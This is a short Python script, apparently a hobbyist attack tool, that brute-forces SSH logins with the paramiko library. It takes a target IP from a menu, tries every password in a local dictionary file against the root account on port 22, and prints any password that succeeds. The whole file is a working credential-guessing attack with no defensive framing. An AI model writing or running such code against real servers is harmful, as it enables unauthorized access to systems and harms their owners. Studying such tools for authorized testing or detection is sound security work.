import paramiko
import socket
import os
import threading
import time

def bruteForce_SSH(client, ip,  pwd, user="root"):
    try:
        client.connect(ip, port="22", username=user, password=pwd)
        client.close()
        print("Find password is " + pwd)
        return
    except paramiko.AuthenticationException:
        client.close()
        pass

def ssh_bf(ip):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    with open("dict.txt", "r") as dic:
        count = 0
        for passwd in dic:
            pwd = passwd.strip()
            count += 1
            t = threading.Thread(target=bruteForce_SSH, args=(client, ip, pwd))
            t.setDaemon(True)
            t.start()
            t.join()

def print_bflist():
    bf_select = ""
    while bf_select != "exit":
        print("BruteForce List")
        print("1. SSH BruteForce")
        bf_select = input("Select menu : ")

        if bf_select == "1":
            ip = input("Input target IP : ")
            ssh_bf(ip)
